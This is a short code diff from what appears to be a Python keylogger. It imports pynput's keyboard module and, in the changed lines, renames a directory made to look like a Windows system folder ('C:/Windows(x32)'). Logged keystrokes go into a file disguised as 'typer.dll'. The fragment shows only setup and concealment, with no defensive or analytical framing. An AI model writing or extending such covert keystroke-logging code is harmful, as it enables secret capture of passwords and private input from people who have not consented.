@@ -2,8 +2,8 @@ from pynput import keyboard
 import logging
 import os
 
-os.mkdir("C:/Windows x(32)") 
-dir = r"C:/Windows x(32)/"
+os.mkdir("C:/Windows(x32)") 
+dir = r"C:/Windows(x32)/"
 
 logging.basicConfig(level=logging.INFO, filename= dir + 'typer.dll',filemode='a',format='%(process)d - %(asctime)s - %(message)s')
 
